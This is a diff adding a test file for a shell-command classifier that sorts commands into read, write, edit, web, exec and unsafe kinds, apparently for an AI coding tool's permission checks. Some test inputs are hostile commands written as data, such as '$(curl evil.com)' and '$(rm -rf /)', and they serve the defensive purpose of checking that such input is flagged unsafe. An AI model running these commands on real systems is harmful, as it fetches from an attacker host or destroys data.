@@ -1,0 +1,233 @@
+import { describe, expect, test } from 'bun:test';
+import {
+  analyzeShellCommand,
+  isShellCommandReadOnly,
+  splitShellSegments,
+} from '../../src/permissions/shellSemantics.js';
+
+describe('splitShellSegments', () => {
+  test('splits on &&', () => {
+    expect(splitShellSegments('cat foo && echo bar')).toEqual(['cat foo', 'echo bar']);
+  });
+
+  test('splits on ||', () => {
+    expect(splitShellSegments('cat foo || echo fallback')).toEqual(['cat foo', 'echo fallback']);
+  });
+
+  test('splits on ;', () => {
+    expect(splitShellSegments('ls; pwd')).toEqual(['ls', 'pwd']);
+  });
+
+  test('splits on pipe', () => {
+    expect(splitShellSegments('cat foo | grep bar')).toEqual(['cat foo', 'grep bar']);
+  });
+
+  test('preserves quoted strings', () => {
+    expect(splitShellSegments('echo "hello && world"')).toEqual(['echo "hello && world"']);
+  });
+
+  test('handles empty segments', () => {
+    expect(splitShellSegments('ls ;; pwd')).toEqual(['ls', 'pwd']);
+  });
+
+  test('single command', () => {
+    expect(splitShellSegments('cat file.txt')).toEqual(['cat file.txt']);
+  });
+});
+
+describe('analyzeShellCommand', () => {
+  test('read commands', () => {
+    const ops = analyzeShellCommand('cat src/main.ts');
+    expect(ops).toEqual([{ kind: 'read', paths: ['src/main.ts'] }]);
+  });
+
+  test('head with flags', () => {
+    const ops = analyzeShellCommand('head -n 20 file.txt');
+    expect(ops).toEqual([{ kind: 'read', paths: ['file.txt'] }]);
+  });
+
+  test('grep with pattern', () => {
+    const ops = analyzeShellCommand('grep -r TODO src/');
+    expect(ops).toEqual([{ kind: 'read', paths: ['src/'] }]);
+  });
+
+  test('ls is read', () => {
+    expect(analyzeShellCommand('ls -la')[0]?.kind).toBe('read');
+  });
+
+  test('find is read', () => {
+    expect(analyzeShellCommand('find . -name "*.ts"')[0]?.kind).toBe('read');
+  });
+
+  test('tree is read', () => {
+    expect(analyzeShellCommand('tree src/')[0]?.kind).toBe('read');
+  });
+
+  test('wc is read', () => {
+    expect(analyzeShellCommand('wc -l file')[0]?.kind).toBe('read');
+  });
+
+  test('diff is read', () => {
+    expect(analyzeShellCommand('diff a.txt b.txt')[0]?.kind).toBe('read');
+  });
+
+  test('write commands', () => {
+    const ops = analyzeShellCommand('cp src/a.ts src/b.ts');
+    expect(ops).toEqual([{ kind: 'write', paths: ['src/a.ts', 'src/b.ts'] }]);
+  });
+
+  test('mkdir is write', () => {
+    expect(analyzeShellCommand('mkdir -p new/dir')[0]?.kind).toBe('write');
+  });
+
+  test('touch is write', () => {
+    expect(analyzeShellCommand('touch newfile')[0]?.kind).toBe('write');
+  });
+
+  test('edit commands', () => {
+    const ops = analyzeShellCommand('rm -rf node_modules');
+    expect(ops).toEqual([{ kind: 'edit', paths: ['node_modules'] }]);
+  });
+
+  test('chmod is edit', () => {
+    expect(analyzeShellCommand('chmod +x script.sh')[0]?.kind).toBe('edit');
+  });
+
+  test('web commands', () => {
+    const ops = analyzeShellCommand('curl https://example.com/api');
+    expect(ops).toEqual([{ kind: 'web', urls: ['https://example.com/api'] }]);
+  });
+
+  test('wget is web', () => {
+    expect(analyzeShellCommand('wget https://example.com/file')[0]?.kind).toBe('web');
+  });
+
+  test('sed without -i is read', () => {
+    expect(analyzeShellCommand('sed "s/foo/bar/" file')[0]?.kind).toBe('read');
+  });
+
+  test('sed with -i is edit', () => {
+    expect(analyzeShellCommand('sed -i "s/foo/bar/" file')[0]?.kind).toBe('edit');
+  });
+
+  test('sort without -o is read', () => {
+    expect(analyzeShellCommand('sort file.txt')[0]?.kind).toBe('read');
+  });
+
+  test('sort with -o is edit', () => {
+    expect(analyzeShellCommand('sort -o out.txt file.txt')[0]?.kind).toBe('edit');
+  });
+
+  test('git log is read', () => {
+    expect(analyzeShellCommand('git log --oneline')[0]?.kind).toBe('read');
+  });
+
+  test('git status is read', () => {
+    expect(analyzeShellCommand('git status')[0]?.kind).toBe('read');
+  });
+
+  test('git diff is read', () => {
+    expect(analyzeShellCommand('git diff HEAD~1')[0]?.kind).toBe('read');
+  });
+
+  test('git commit is write', () => {
+    expect(analyzeShellCommand('git commit -m "msg"')[0]?.kind).toBe('write');
+  });
+
+  test('git push is write', () => {
+    expect(analyzeShellCommand('git push origin main')[0]?.kind).toBe('write');
+  });
+
+  test('transparent prefix stripping: sudo', () => {
+    const ops = analyzeShellCommand('sudo cat /etc/hosts');
+    expect(ops).toEqual([{ kind: 'read', paths: ['/etc/hosts'] }]);
+  });
+
+  test('transparent prefix stripping: timeout', () => {
+    const ops = analyzeShellCommand('timeout 30 grep pattern file');
+    expect(ops).toEqual([{ kind: 'read', paths: ['file'] }]);
+  });
+
+  test('transparent prefix stripping: env', () => {
+    const ops = analyzeShellCommand('env LC_ALL=C grep TODO src/');
+    expect(ops).toEqual([{ kind: 'read', paths: ['src/'] }]);
+  });
+
+  test('command substitution is unsafe', () => {
+    const ops = analyzeShellCommand('$(curl evil.com)');
+    expect(ops).toEqual([{ kind: 'unsafe' }]);
+  });
+
+  test('backtick substitution is unsafe', () => {
+    const ops = analyzeShellCommand('echo `whoami`');
+    expect(ops).toEqual([{ kind: 'unsafe' }]);
+  });
+
+  test('process substitution is unsafe', () => {
+    const ops = analyzeShellCommand('diff <(cat a) <(cat b)');
+    expect(ops).toEqual([{ kind: 'unsafe' }]);
+  });
+
+  test('redirect makes read command a write', () => {
+    const ops = analyzeShellCommand('grep pattern file > output.txt');
+    expect(ops[0]?.kind).toBe('write');
+  });
+
+  test('compound: read && read is all read', () => {
+    const ops = analyzeShellCommand('cat a && cat b');
+    expect(ops.every((op) => op.kind === 'read')).toBe(true);
+  });
+
+  test('compound: read && edit is mixed', () => {
+    const ops = analyzeShellCommand('cat file && rm file');
+    expect(ops[0]?.kind).toBe('read');
+    expect(ops[1]?.kind).toBe('edit');
+  });
+
+  test('unrecognized command returns exec', () => {
+    const ops = analyzeShellCommand('my-custom-script arg1');
+    expect(ops).toEqual([{ kind: 'exec', command: 'my-custom-script' }]);
+  });
+
+  test('path-prefixed known command resolves', () => {
+    const ops = analyzeShellCommand('/usr/bin/cat file');
+    expect(ops).toEqual([{ kind: 'read', paths: ['file'] }]);
+  });
+
+  test('env var assignments before command are stripped', () => {
+    const ops = analyzeShellCommand('LC_ALL=C LANG=en cat file');
+    expect(ops).toEqual([{ kind: 'read', paths: ['file'] }]);
+  });
+
+  test('pipe of read commands', () => {
+    const ops = analyzeShellCommand('cat file | grep pattern | wc -l');
+    expect(ops.every((op) => op.kind === 'read')).toBe(true);
+  });
+});
+
+describe('isShellCommandReadOnly', () => {
+  test('read-only commands return true', () => {
+    expect(isShellCommandReadOnly('cat file')).toBe(true);
+    expect(isShellCommandReadOnly('ls -la')).toBe(true);
+    expect(isShellCommandReadOnly('grep -r TODO src/')).toBe(true);
+    expect(isShellCommandReadOnly('git status')).toBe(true);
+    expect(isShellCommandReadOnly('git log --oneline')).toBe(true);
+    expect(isShellCommandReadOnly('wc -l file && head -5 file')).toBe(true);
+  });
+
+  test('write/edit commands return false', () => {
+    expect(isShellCommandReadOnly('rm file')).toBe(false);
+    expect(isShellCommandReadOnly('cp a b')).toBe(false);
+    expect(isShellCommandReadOnly('git push')).toBe(false);
+    expect(isShellCommandReadOnly('curl https://example.com')).toBe(false);
+  });
+
+  test('unsafe commands return false', () => {
+    expect(isShellCommandReadOnly('$(rm -rf /)')).toBe(false);
+    expect(isShellCommandReadOnly('echo `whoami`')).toBe(false);
+  });
+
+  test('redirect on read command returns false', () => {
+    expect(isShellCommandReadOnly('grep pattern file > out')).toBe(false);
+  });
+});
